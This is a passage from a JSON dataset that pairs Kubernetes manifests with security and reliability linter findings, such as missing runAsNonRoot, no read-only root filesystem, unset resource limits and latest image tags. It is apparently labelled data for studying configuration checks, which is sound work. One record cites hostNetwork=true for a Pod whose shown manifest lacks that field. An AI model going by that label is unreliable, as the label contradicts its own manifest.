    "violation_text": "container \"opal-client\" has memory limit 0"
  },
  {
    "id": "2694",
    "manifest_path": "data/manifests/the_stack_sample/sample_0749.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: catalogue-db\n  labels:\n    name: catalogue-db\nspec:\n  containers:\n  - name: catalogue-db\n    image: weaveworksdemos/catalogue-db:0.2.0\n    env:\n    - name: MYSQL_ROOT_PASSWORD\n      value: fake_password\n    - name: MYSQL_DATABASE\n      value: socksdb\n    ports:\n    - name: mysql\n      containerPort: 3306\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"catalogue-db\" does not have a read-only root file system"
  },
  {
    "id": "2695",
    "manifest_path": "data/manifests/the_stack_sample/sample_0749.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: catalogue-db\n  labels:\n    name: catalogue-db\nspec:\n  containers:\n  - name: catalogue-db\n    image: weaveworksdemos/catalogue-db:0.2.0\n    env:\n    - name: MYSQL_ROOT_PASSWORD\n      value: fake_password\n    - name: MYSQL_DATABASE\n      value: socksdb\n    ports:\n    - name: mysql\n      containerPort: 3306\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"catalogue-db\" is not set to runAsNonRoot"
  },
  {
    "id": "2696",
    "manifest_path": "data/manifests/the_stack_sample/sample_0749.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: catalogue-db\n  labels:\n    name: catalogue-db\nspec:\n  containers:\n  - name: catalogue-db\n    image: weaveworksdemos/catalogue-db:0.2.0\n    env:\n    - name: MYSQL_ROOT_PASSWORD\n      value: fake_password\n    - name: MYSQL_DATABASE\n      value: socksdb\n    ports:\n    - name: mysql\n      containerPort: 3306\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"catalogue-db\" has cpu request 0"
  },
  {
    "id": "2697",
    "manifest_path": "data/manifests/the_stack_sample/sample_0749.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: catalogue-db\n  labels:\n    name: catalogue-db\nspec:\n  containers:\n  - name: catalogue-db\n    image: weaveworksdemos/catalogue-db:0.2.0\n    env:\n    - name: MYSQL_ROOT_PASSWORD\n      value: fake_password\n    - name: MYSQL_DATABASE\n      value: socksdb\n    ports:\n    - name: mysql\n      containerPort: 3306\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"catalogue-db\" has memory limit 0"
  },
  {
    "id": "2698",
    "manifest_path": "data/manifests/the_stack_sample/sample_0750.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: api\n  name: api\nspec:\n  ports:\n  - port: 8080\n    targetPort: 8080\n    protocol: TCP\n  selector:\n    app: api\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:api])"
  },
  {
    "id": "2699",
    "manifest_path": "data/manifests/the_stack_sample/sample_0751.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: quotesweb\n  labels:\n    app: quotesweb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: quotesweb\n  template:\n    metadata:\n      labels:\n        app: quotesweb\n    spec:\n      containers:\n      - name: quotes\n        image: quay.io/donschenck/quotesweb:v1\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 3000\n          protocol: TCP\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"quotes\" does not have a read-only root file system"
  },
  {
    "id": "2700",
    "manifest_path": "data/manifests/the_stack_sample/sample_0751.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: quotesweb\n  labels:\n    app: quotesweb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: quotesweb\n  template:\n    metadata:\n      labels:\n        app: quotesweb\n    spec:\n      containers:\n      - name: quotes\n        image: quay.io/donschenck/quotesweb:v1\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 3000\n          protocol: TCP\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"quotes\" is not set to runAsNonRoot"
  },
  {
    "id": "2701",
    "manifest_path": "data/manifests/the_stack_sample/sample_0751.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: quotesweb\n  labels:\n    app: quotesweb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: quotesweb\n  template:\n    metadata:\n      labels:\n        app: quotesweb\n    spec:\n      containers:\n      - name: quotes\n        image: quay.io/donschenck/quotesweb:v1\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 3000\n          protocol: TCP\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"quotes\" has cpu request 0"
  },
  {
    "id": "2702",
    "manifest_path": "data/manifests/the_stack_sample/sample_0751.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: quotesweb\n  labels:\n    app: quotesweb\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: quotesweb\n  template:\n    metadata:\n      labels:\n        app: quotesweb\n    spec:\n      containers:\n      - name: quotes\n        image: quay.io/donschenck/quotesweb:v1\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 3000\n          protocol: TCP\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"quotes\" has memory limit 0"
  },
  {
    "id": "2703",
    "manifest_path": "data/manifests/the_stack_sample/sample_0757.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: demo-php\n  labels:\n    app: demo\nspec:\n  selector:\n    matchLabels:\n      app: demo\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: demo\n    spec:\n      containers:\n      - name: demo-php\n        image: demo-php:latest\n        imagePullPolicy: Never\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 9000\n      - name: demo-nginx\n        image: demo-nginx:latest\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 80\n        resources:\n          limits:\n            cpu: 150m\n          requests:\n            cpu: 50m\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"demo-nginx\" is using an invalid container image, \"demo-nginx:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2704",
    "manifest_path": "data/manifests/the_stack_sample/sample_0757.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: demo-php\n  labels:\n    app: demo\nspec:\n  selector:\n    matchLabels:\n      app: demo\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: demo\n    spec:\n      containers:\n      - name: demo-php\n        image: demo-php:latest\n        imagePullPolicy: Never\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 9000\n      - name: demo-nginx\n        image: demo-nginx:latest\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 80\n        resources:\n          limits:\n            cpu: 150m\n          requests:\n            cpu: 50m\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"demo-php\" is using an invalid container image, \"demo-php:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2705",
    "manifest_path": "data/manifests/the_stack_sample/sample_0757.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: demo-php\n  labels:\n    app: demo\nspec:\n  selector:\n    matchLabels:\n      app: demo\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: demo\n    spec:\n      containers:\n      - name: demo-php\n        image: demo-php:latest\n        imagePullPolicy: Never\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 9000\n      - name: demo-nginx\n        image: demo-nginx:latest\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 80\n        resources:\n          limits:\n            cpu: 150m\n          requests:\n            cpu: 50m\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "2706",
    "manifest_path": "data/manifests/the_stack_sample/sample_0757.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: demo-php\n  labels:\n    app: demo\nspec:\n  selector:\n    matchLabels:\n      app: demo\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: demo\n    spec:\n      containers:\n      - name: demo-php\n        image: demo-php:latest\n        imagePullPolicy: Never\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 9000\n      - name: demo-nginx\n        image: demo-nginx:latest\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 80\n        resources:\n          limits:\n            cpu: 150m\n          requests:\n            cpu: 50m\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"demo-nginx\" does not have a read-only root file system"
  },
  {
    "id": "2707",
    "manifest_path": "data/manifests/the_stack_sample/sample_0757.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: demo-php\n  labels:\n    app: demo\nspec:\n  selector:\n    matchLabels:\n      app: demo\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: demo\n    spec:\n      containers:\n      - name: demo-php\n        image: demo-php:latest\n        imagePullPolicy: Never\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 9000\n      - name: demo-nginx\n        image: demo-nginx:latest\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 80\n        resources:\n          limits:\n            cpu: 150m\n          requests:\n            cpu: 50m\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"demo-php\" does not have a read-only root file system"
  },
  {
    "id": "2708",
    "manifest_path": "data/manifests/the_stack_sample/sample_0757.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: demo-php\n  labels:\n    app: demo\nspec:\n  selector:\n    matchLabels:\n      app: demo\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: demo\n    spec:\n      containers:\n      - name: demo-php\n        image: demo-php:latest\n        imagePullPolicy: Never\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 9000\n      - name: demo-nginx\n        image: demo-nginx:latest\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 80\n        resources:\n          limits:\n            cpu: 150m\n          requests:\n            cpu: 50m\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"demo-nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "2709",
    "manifest_path": "data/manifests/the_stack_sample/sample_0757.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: demo-php\n  labels:\n    app: demo\nspec:\n  selector:\n    matchLabels:\n      app: demo\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: demo\n    spec:\n      containers:\n      - name: demo-php\n        image: demo-php:latest\n        imagePullPolicy: Never\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 9000\n      - name: demo-nginx\n        image: demo-nginx:latest\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 80\n        resources:\n          limits:\n            cpu: 150m\n          requests:\n            cpu: 50m\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"demo-php\" is not set to runAsNonRoot"
  },
  {
    "id": "2710",
    "manifest_path": "data/manifests/the_stack_sample/sample_0757.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: demo-php\n  labels:\n    app: demo\nspec:\n  selector:\n    matchLabels:\n      app: demo\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: demo\n    spec:\n      containers:\n      - name: demo-php\n        image: demo-php:latest\n        imagePullPolicy: Never\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 9000\n      - name: demo-nginx\n        image: demo-nginx:latest\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 80\n        resources:\n          limits:\n            cpu: 150m\n          requests:\n            cpu: 50m\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"demo-nginx\" has memory limit 0"
  },
  {
    "id": "2711",
    "manifest_path": "data/manifests/the_stack_sample/sample_0757.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: demo-php\n  labels:\n    app: demo\nspec:\n  selector:\n    matchLabels:\n      app: demo\n  replicas: 3\n  template:\n    metadata:\n      labels:\n        app: demo\n    spec:\n      containers:\n      - name: demo-php\n        image: demo-php:latest\n        imagePullPolicy: Never\n        resources:\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        ports:\n        - containerPort: 9000\n      - name: demo-nginx\n        image: demo-nginx:latest\n        imagePullPolicy: Never\n        ports:\n        - containerPort: 80\n        resources:\n          limits:\n            cpu: 150m\n          requests:\n            cpu: 50m\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"demo-php\" has memory limit 0"
  },
  {
    "id": "2712",
    "manifest_path": "data/manifests/the_stack_sample/sample_0760.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20211216-b5865074c4\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --update-period=6h\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"needs-rebase\" does not have a read-only root file system"
  },
  {
    "id": "2713",
    "manifest_path": "data/manifests/the_stack_sample/sample_0760.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20211216-b5865074c4\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --update-period=6h\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"needs-rebase\" is not set to runAsNonRoot"
  },
  {
    "id": "2714",
    "manifest_path": "data/manifests/the_stack_sample/sample_0760.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20211216-b5865074c4\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --update-period=6h\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"needs-rebase\" has cpu request 0"
  },
  {
    "id": "2715",
    "manifest_path": "data/manifests/the_stack_sample/sample_0760.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20211216-b5865074c4\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --update-period=6h\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"needs-rebase\" has memory limit 0"
  },
  {
    "id": "2716",
    "manifest_path": "data/manifests/the_stack_sample/sample_0761.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: bookstore-addbook\n  labels:\n    app: add-book\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: add-book\n  template:\n    metadata:\n      labels:\n        app: add-book\n    spec:\n      containers:\n      - name: addbook\n        image: pkarthick83/appinframodwithgke:addbook-latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        env:\n        - name: MYSQL_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: mysql-secret\n              key: username\n        - name: MYSQL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql-secret\n              key: password\n        - name: DB_HOST\n          valueFrom:\n            secretKeyRef:\n              name: mysql-secret\n              key: dbhost\n        readinessProbe:\n          httpGet:\n            path: /actuator/health\n            port: 8080\n          initialDelaySeconds: 30\n          periodSeconds: 15\n          failureThreshold: 3\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"addbook\" does not have a read-only root file system"
  },
  {
    "id": "2717",
    "manifest_path": "data/manifests/the_stack_sample/sample_0761.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: bookstore-addbook\n  labels:\n    app: add-book\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: add-book\n  template:\n    metadata:\n      labels:\n        app: add-book\n    spec:\n      containers:\n      - name: addbook\n        image: pkarthick83/appinframodwithgke:addbook-latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        env:\n        - name: MYSQL_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: mysql-secret\n              key: username\n        - name: MYSQL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql-secret\n              key: password\n        - name: DB_HOST\n          valueFrom:\n            secretKeyRef:\n              name: mysql-secret\n              key: dbhost\n        readinessProbe:\n          httpGet:\n            path: /actuator/health\n            port: 8080\n          initialDelaySeconds: 30\n          periodSeconds: 15\n          failureThreshold: 3\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"addbook\" is not set to runAsNonRoot"
  },
  {
    "id": "2718",
    "manifest_path": "data/manifests/the_stack_sample/sample_0761.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: bookstore-addbook\n  labels:\n    app: add-book\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: add-book\n  template:\n    metadata:\n      labels:\n        app: add-book\n    spec:\n      containers:\n      - name: addbook\n        image: pkarthick83/appinframodwithgke:addbook-latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        env:\n        - name: MYSQL_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: mysql-secret\n              key: username\n        - name: MYSQL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql-secret\n              key: password\n        - name: DB_HOST\n          valueFrom:\n            secretKeyRef:\n              name: mysql-secret\n              key: dbhost\n        readinessProbe:\n          httpGet:\n            path: /actuator/health\n            port: 8080\n          initialDelaySeconds: 30\n          periodSeconds: 15\n          failureThreshold: 3\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"addbook\" has cpu request 0"
  },
  {
    "id": "2719",
    "manifest_path": "data/manifests/the_stack_sample/sample_0761.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: bookstore-addbook\n  labels:\n    app: add-book\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: add-book\n  template:\n    metadata:\n      labels:\n        app: add-book\n    spec:\n      containers:\n      - name: addbook\n        image: pkarthick83/appinframodwithgke:addbook-latest\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 8080\n        env:\n        - name: MYSQL_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: mysql-secret\n              key: username\n        - name: MYSQL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysql-secret\n              key: password\n        - name: DB_HOST\n          valueFrom:\n            secretKeyRef:\n              name: mysql-secret\n              key: dbhost\n        readinessProbe:\n          httpGet:\n            path: /actuator/health\n            port: 8080\n          initialDelaySeconds: 30\n          periodSeconds: 15\n          failureThreshold: 3\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"addbook\" has memory limit 0"
  },
  {
    "id": "2720",
    "manifest_path": "data/manifests/the_stack_sample/sample_0762.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mfpod\nspec:\n  containers:\n  - name: mynginxcon\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "2721",
    "manifest_path": "data/manifests/the_stack_sample/sample_0762.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mfpod\nspec:\n  containers:\n  - name: mynginxcon\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"mynginxcon\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2722",
    "manifest_path": "data/manifests/the_stack_sample/sample_0762.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mfpod\nspec:\n  containers:\n  - name: mynginxcon\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mynginxcon\" does not have a read-only root file system"
  },
  {
    "id": "2723",
    "manifest_path": "data/manifests/the_stack_sample/sample_0762.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mfpod\nspec:\n  containers:\n  - name: mynginxcon\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mynginxcon\" is not set to runAsNonRoot"
  },
  {
    "id": "2724",
    "manifest_path": "data/manifests/the_stack_sample/sample_0762.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mfpod\nspec:\n  containers:\n  - name: mynginxcon\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mynginxcon\" has cpu request 0"
  },
  {
    "id": "2725",
    "manifest_path": "data/manifests/the_stack_sample/sample_0762.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: mfpod\nspec:\n  containers:\n  - name: mynginxcon\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mynginxcon\" has memory limit 0"
  },
  {
    "id": "2726",
    "manifest_path": "data/manifests/the_stack_sample/sample_0763.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.4\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "2727",
    "manifest_path": "data/manifests/the_stack_sample/sample_0763.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.4\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "2728",
    "manifest_path": "data/manifests/the_stack_sample/sample_0763.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.4\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "2729",
    "manifest_path": "data/manifests/the_stack_sample/sample_0763.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.4\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "2730",
    "manifest_path": "data/manifests/the_stack_sample/sample_0763.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx-deployment\n  labels:\n    app: nginx\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:1.17.4\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "2731",
    "manifest_path": "data/manifests/the_stack_sample/sample_0764.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9591\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "2732",
    "manifest_path": "data/manifests/the_stack_sample/sample_0764.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9591\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "2733",
    "manifest_path": "data/manifests/the_stack_sample/sample_0764.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9591\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "2734",
    "manifest_path": "data/manifests/the_stack_sample/sample_0764.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9591\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "2735",
    "manifest_path": "data/manifests/the_stack_sample/sample_0764.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-9591\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "2736",
    "manifest_path": "data/manifests/the_stack_sample/sample_0766.yaml",
